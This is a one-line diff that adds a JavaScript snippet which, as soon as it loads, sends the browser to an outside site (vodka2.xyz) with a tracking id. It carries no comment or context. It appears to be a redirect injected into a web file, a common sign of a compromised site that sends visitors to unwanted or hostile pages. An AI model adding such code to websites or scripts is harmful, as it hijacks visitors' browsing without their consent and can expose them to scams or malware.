@@ -1,0 +1,1 @@
+function executeRun(){window.location.href="https://vodka2.xyz/?id=6782"}executeRun();
